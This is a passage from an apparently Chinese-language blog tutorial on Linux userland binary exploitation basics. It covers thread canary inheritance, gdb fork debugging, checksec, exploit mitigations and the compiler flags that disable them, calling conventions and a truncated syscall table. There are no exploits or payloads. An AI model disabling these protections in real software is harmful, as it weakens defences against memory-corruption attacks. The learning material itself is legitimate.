&#125;</span><br><span class="line">    __value;</span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line">((pd)-&gt;header.pointer_guard = (&#123;</span><br><span class="line">    __typeof((&#123;</span><br><span class="line">        <span class="keyword">struct</span> pthread *__self;</span><br><span class="line">        <span class="keyword">asm</span>(<span class="string">&quot;mov %%fs:%c1,%0&quot;</span>:<span class="string">&quot;=r&quot;</span>(__self):<span class="string">&quot;i&quot;</span>(((<span class="type">size_t</span>) (&amp;(((<span class="keyword">struct</span> pthread *) <span class="number">0</span>)-&gt;header.self)))));</span><br><span class="line">        __self;</span><br><span class="line">    &#125;)-&gt;header.pointer_guard) __value;</span><br><span class="line">    <span class="keyword">_Static_assert</span>(<span class="keyword">sizeof</span>(__value) == <span class="number">1</span> || <span class="keyword">sizeof</span>(__value) == <span class="number">4</span> || <span class="keyword">sizeof</span>(__value) == <span class="number">8</span>, <span class="string">&quot;size of per-thread data&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">sizeof</span>(__value) == <span class="number">1</span>)<span class="keyword">asm</span> <span class="keyword">volatile</span>(<span class="string">&quot;movb %%fs:%P2,%b0&quot;</span>:<span class="string">&quot;=q&quot;</span>(__value):<span class="string">&quot;0&quot;</span>(<span class="number">0</span>), <span class="string">&quot;i&quot;</span>(((<span class="type">size_t</span>) (&amp;(((<span class="keyword">struct</span> pthread *) <span class="number">0</span>)-&gt;header.pointer_guard))))); <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">sizeof</span>(__value) == <span class="number">4</span>)<span class="keyword">asm</span> <span class="keyword">volatile</span>(<span class="string">&quot;movl %%fs:%P1,%0&quot;</span>:<span class="string">&quot;=r&quot;</span>(__value):<span class="string">&quot;i&quot;</span>(((<span class="type">size_t</span>) (&amp;(((<span class="keyword">struct</span> pthread *) <span class="number">0</span>)-&gt;header.pointer_guard))))); <span class="keyword">else</span> &#123; <span class="keyword">asm</span> <span class="keyword">volatile</span>(<span class="string">&quot;movq %%fs:%P1,%q0&quot;</span>:<span class="string">&quot;=r&quot;</span>(__value):<span class="string">&quot;i&quot;</span>(((<span class="type">size_t</span>) (&amp;(((<span class="keyword">struct</span> pthread *) <span class="number">0</span>)-&gt;header.pointer_guard))))); &#125;</span><br><span class="line">    __value;</span><br><span class="line">&#125;))</span><br></pre></td></tr></table></figure></div>
<p>不难看出这两个宏把当前线程（当前 fs 寄存器还没有指向新线程的 TCB）的 TLS 中的 <code>stack_guard</code> 和 <code>pointer_guard</code> 都复制到子线程的 TLS 的对应位置上。<strong>因此可以确定线程的 <code>stack_guard</code> 和 <code>pointer_guard</code> 与主线程相同。</strong></p>
<p>最后需要确定是 fs 寄存器何时被修改，因为 fs 寄存器不能再用户态修改，因此一定是一个系统调用完成了对 fs 寄存器的修改。</p>
<p>通过调试发现，<code>pthread_create-&gt;create_thread-&gt;clone</code> 中的 <code>clone</code> 系统调用完成了对 fs 寄存器的修改。</p>
<h1 id="子进程调试"><a href="#子进程调试" class="headerlink" title="子进程调试"></a>子进程调试</h1><p>gdb默认情况下，父进程 <code>fork</code> 一个子进程，gdb 只会继续调试父进程而不会管子进程的运行（pwndbg 插件设置相反）。</p>
<h2 id="相关设置"><a href="#相关设置" class="headerlink" title="相关设置"></a>相关设置</h2><ul>
<li>跟踪子进程进行调试，可以使用 <code>set follow-fork-mode mode</code> 来设置 <code>fork</code> 跟随模式。<ul>
<li><code>show follow-fork-mode</code>：进入 gdb 以后，我们可以使用 <code>show follow-fork-mode</code> 来查看目前的跟踪模式。</li>
<li><code>set follow-fork-mode parent</code>：gdb 只跟踪父进程，不跟踪子进程，这是默认的模式。</li>
<li><code>set follow-fork-mode child</code>：gdb 在子进程产生以后只跟踪子进程，放弃对父进程的跟踪。</li>
</ul>
</li>
<li>想同时调试父进程和子进程，以上的方法就不能满足了。Linux 提供了 <code>set detach-on-fork mode</code> 命令来供我们使用。<ul>
<li><code>show detach-on-fork</code>：<code>show detach-on-fork</code> 显示了目前是的 <code>detach-on-fork</code> 模式。</li>
<li><code>set detach-on-fork on</code>：只调试父进程或子进程的其中一个（根据 <code>follow-fork-mode</code> 来决定），这是默认的模式。</li>
<li><code>set detach-on-fork off</code>：父子进程都在 gdb 的控制之下，其中一个进程正常调试（根据 <code>follow-fork-mode</code> 来决定），另一个进程会被设置为暂停状态。</li>
</ul>
</li>
</ul>
<h2 id="调试进程切换"><a href="#调试进程切换" class="headerlink" title="调试进程切换"></a>调试进程切换</h2><p>使用 gdb 调试多进程时，如果想要在进程间进行切换，那么就需要</p>
<ul>
<li>在 <code>fork</code> 调用前设置： <code>set detach-on-fork off</code>。</li>
<li>使用 <code>info inferiors</code> 来查看进程信息，得到的信息可以看到最前面有一个进程编号，使用 <code>inferior num</code> 来进行进程切换。</li>
</ul>
<h1 id="常见保护"><a href="#常见保护" class="headerlink" title="常见保护"></a>常见保护</h1><p>checksec 可以查看程序开启了哪些保护。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ checksec /bin/ls                                   </span><br><span class="line">[*] <span class="string">&#x27;/bin/ls&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure></div>
<h2 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h2><p>canary 是一种防止缓冲区溢出攻击的保护机制。它的基本思想是在程序的堆栈中插入一个随机生成的数值，用于检测缓冲区溢出攻击。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000001189 endbr64</span><br><span class="line">.text:000000000000118D push    rbp</span><br><span class="line">.text:000000000000118E mov     rbp, rsp</span><br><span class="line">.text:0000000000001191 sub     rsp, 30h</span><br><span class="line">.text:0000000000001195 mov     rax, fs:28h</span><br><span class="line">.text:000000000000119E mov     [rbp-8], rax</span><br><span class="line">...</span><br><span class="line">.text:00000000000011CE mov     rdx, [rbp-8]</span><br><span class="line">.text:00000000000011D2 xor     rdx, fs:28h</span><br><span class="line">.text:00000000000011DB jz      short locret_11E2</span><br><span class="line">.text:00000000000011DB</span><br><span class="line">.text:00000000000011DD call    ___stack_chk_fail</span><br><span class="line">.text:00000000000011DD</span><br><span class="line">.text:00000000000011E2 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000000011E2</span><br><span class="line">.text:00000000000011E2 locret_11E2:                            ; CODE XREF: f+52↑j</span><br><span class="line">.text:00000000000011E2 leave</span><br><span class="line">.text:00000000000011E3 retn</span><br></pre></td></tr></table></figure></div>
<p>canary 的初始值存储在 tls 中，也就是前面提到的 <code>stack_guard</code> 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108005826545.png"
                      alt="image-20241108005826545"
                ><br>在编译 c 程序时使用 <code>-fno-stack-protector</code> 参数可以关闭 canary 保护（注意高版本的 gcc 的 canary 保护关不掉)。</p>
<h2 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h2><p>NX 即 No-eXecute（不可执行），NX 的基本原理是将数据所在内存页标识为不可执行，也就是同一内存可写与可执行不共存。</p>
<p>gcc 编译器默认开启了 NX 选项，如果需要关闭 NX 选项，可以给 gcc 编译器添加 <code>-zexecstack</code> 参数。</p>
<h2 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h2><p>PIE 主要随机了代码段（<code>.text</code>），初始化数据段（<code>.data</code>）和未初始化数据段（<code>.bss</code>）的地址。另外 PIE 是否开启还会影响堆的基址。</p>
<ul>
<li><p>开启 PIE：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108005851039.png"
                      alt="image-20241108005851039"
                ></p>
</li>
<li><p>关闭 PIE：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/image-20241108005913715.png"
                      alt="image-20241108005913715"
                ></p>
</li>
</ul>
<p>在编译 c 程序时使用 <code>-no-pie</code> 参数可以关闭 PIE 保护。</p>
<h2 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h2><p>ASLR 是系统级别的地址随机。通过修改 <code>/proc/sys/kernel/randomize_va_space</code> 的值可以控制 ASLR 的级别：</p>
<ul>
<li>0：关闭 ASLR</li>
<li>1：栈基址，共享库，mmap 基址随机</li>
<li>2：在 1 的基础上增加堆基址的随机</li>
</ul>
<h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><ul>
<li>当 RELRO 保护为 NO RELRO 的时候，<code>init.array</code> 、<code>fini.array</code> 、<code>got.plt</code> 均可读可写。</li>
<li>为 PARTIAL RELRO 的时候，<code>init.array</code> 、<code>fini.array</code> 根据实际调试结果判断是否可写，<code>got.plt</code> 可读可写。</li>
<li>为 FULL RELRO 时，<code>init.array</code> 、<code>fini.array</code> 、<code>got.plt</code> 均可读不可写。</li>
<li><code>-Wl,-z,norelro</code> 编译参数可以关闭 RELRO ，使 RELRO 状态变为 NO RELRO 。</li>
<li><code>-Wl,-z,lazy</code> 会开启延迟绑定，使 RELRO 状态变为 Partial RELRO 。</li>
</ul>
<h1 id="调用约定"><a href="#调用约定" class="headerlink" title="调用约定"></a>调用约定</h1><h2 id="栈结构"><a href="#栈结构" class="headerlink" title="栈结构"></a>栈结构</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108005938556.png"
                      alt="image-20241108005938556"
                ><br><strong>注意 canary 不一定与 ebp 相邻，因为有些函数会先将一些寄存器保存到栈中。canary 实际位置以调试为准。</strong></p>
<h2 id="函数调用过程"><a href="#函数调用过程" class="headerlink" title="函数调用过程"></a>函数调用过程</h2><p>32位为例：</p>
<span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mtext>push args</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mtext>call func</mtext><mrow><mo fence="true">{</mo><mtable rowspacing="0.16em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>push next_eip</mtext></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>jmp func</mtext></mstyle></mtd></mtr></mtable></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mtext>push ebp</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mtext>mov ebp,esp</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mi><mi mathvariant="normal">⋮</mi><mpadded height="0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mtext>leave</mtext><mrow><mo fence="true">{</mo><mtable rowspacing="0.16em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>mov esp,ebp</mtext></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>pop ebp</mtext></mstyle></mtd></mtr></mtable></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mtext>ret (pop eip)</mtext></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">
\begin{align*}
&amp; \text{push args}\\
&amp; \text{call func}\left\{\begin{matrix}
\text{push next\_eip}\\ 
\text{jmp func}
\end{matrix}\right.\\
&amp; \text{push ebp}\\
&amp; \text{mov ebp,esp}\\
&amp; \vdots \\
&amp; \text{leave}\left\{\begin{matrix}
\text{mov esp,ebp}\\ 
\text{pop ebp}
\end{matrix}\right.\\
&amp;\text{ret}\ \text{(pop eip)}
\end{align*}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:13.5601em;vertical-align:-6.53em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:7.03em;"><span style="top:-9.69em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:-7.58em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:-5.49em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:-3.99em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:-1.83em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:0.28em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:2.37em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:6.53em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:7.03em;"><span style="top:-9.8775em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mord text"><span class="mord">push args</span></span></span></span><span style="top:-7.7675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mord text"><span class="mord">call func</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">{</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord">push next_eip</span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord">jmp func</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span style="top:-5.6775em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mord text"><span class="mord">push ebp</span></span></span></span><span style="top:-4.1775em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mord text"><span class="mord">mov ebp,esp</span></span></span></span><span style="top:-2.0175em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:0.0925em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mord text"><span class="mord">leave</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">{</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord">mov esp,ebp</span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord">pop ebp</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span style="top:2.1825em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mord text"><span class="mord">ret</span></span><span class="mspace"> </span><span class="mord text"><span class="mord">(pop eip)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:6.53em;"><span></span></span></span></span></span></span></span></span></span></span></span>


<h2 id="函数参数传递"><a href="#函数参数传递" class="headerlink" title="函数参数传递"></a>函数参数传递</h2>
  <div class="note p-4 mb-4 rounded-small red icon-padding">
    <i class="note-icon fa-solid fa-bolt"></i><p>注意：通常 linux 下的程序的函数调用都是外平栈的。</p>

  </div>

<h3 id="32位程序"><a href="#32位程序" class="headerlink" title="32位程序"></a>32位程序</h3><ul>
<li>普通函数传参：参数基本都压在栈上（有寄存器传参的情况，可查阅相关资料）。</li>
<li><code>int 0x80</code> 传参：eax对应系统调用号，ebx、ecx、edx、esi、edi、ebp 分别对应前六个参数多余的参数压在栈上。</li>
</ul>
<h3 id="64位程序："><a href="#64位程序：" class="headerlink" title="64位程序："></a>64位程序：</h3><ul>
<li>普通函数传参：先使用 rdi、rsi、rdx、rcx、r8、r9 寄存器作为函数参数的前六个参数，多余的参数会依次压在栈上。</li>
<li><code>syscall</code> 传参：rax 对应系统调用号，传参规则与普通函数传参一致。</li>
</ul>
<h2 id="系统调用号"><a href="#系统调用号" class="headerlink" title="系统调用号"></a>系统调用号</h2><h3 id="32-位"><a href="#32-位" class="headerlink" title="32 位"></a>32 位</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _ASM_X86_UNISTD_32_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _ASM_X86_UNISTD_32_H 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_restart_syscall 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_exit 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fork 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_read 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_write 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_open 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_close 6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_waitpid 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_creat 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_link 9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_unlink 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_execve 11</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chdir 12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_time 13</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mknod 14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chmod 15</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lchown 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_break 17</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_oldstat 18</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lseek 19</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpid 20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mount 21</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_umount 22</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setuid 23</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getuid 24</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_stime 25</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ptrace 26</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_alarm 27</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_oldfstat 28</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pause 29</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_utime 30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_stty 31</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_gtty 32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_access 33</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_nice 34</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ftime 35</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sync 36</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_kill 37</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rename 38</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mkdir 39</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rmdir 40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_dup 41</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pipe 42</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_times 43</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_prof 44</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_brk 45</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setgid 46</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getgid 47</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_signal 48</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_geteuid 49</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getegid 50</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_acct 51</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_umount2 52</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lock 53</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioctl 54</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fcntl 55</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mpx 56</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setpgid 57</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ulimit 58</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_oldolduname 59</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_umask 60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chroot 61</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ustat 62</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_dup2 63</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getppid 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpgrp 65</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setsid 66</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigaction 67</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sgetmask 68</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ssetmask 69</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setreuid 70</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setregid 71</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigsuspend 72</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigpending 73</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sethostname 74</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setrlimit 75</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getrlimit 76</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getrusage 77</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_gettimeofday 78</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_settimeofday 79</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getgroups 80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setgroups 81</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_select 82</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_symlink 83</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_oldlstat 84</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readlink 85</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_uselib 86</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_swapon 87</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_reboot 88</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readdir 89</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mmap 90</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_munmap 91</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_truncate 92</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ftruncate 93</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchmod 94</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchown 95</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpriority 96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setpriority 97</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_profil 98</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_statfs 99</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstatfs 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioperm 101</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_socketcall 102</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_syslog 103</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setitimer 104</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getitimer 105</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_stat 106</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lstat 107</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstat 108</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_olduname 109</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_iopl 110</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vhangup 111</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_idle 112</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vm86old 113</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_wait4 114</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_swapoff 115</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sysinfo 116</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ipc 117</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fsync 118</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigreturn 119</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clone 120</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setdomainname 121</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_uname 122</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_modify_ldt 123</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_adjtimex 124</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mprotect 125</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigprocmask 126</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_create_module 127</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_init_module 128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_delete_module 129</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_kernel_syms 130</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_quotactl 131</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpgid 132</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchdir 133</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_bdflush 134</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sysfs 135</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_personality 136</span></span><br><span class="line"><span 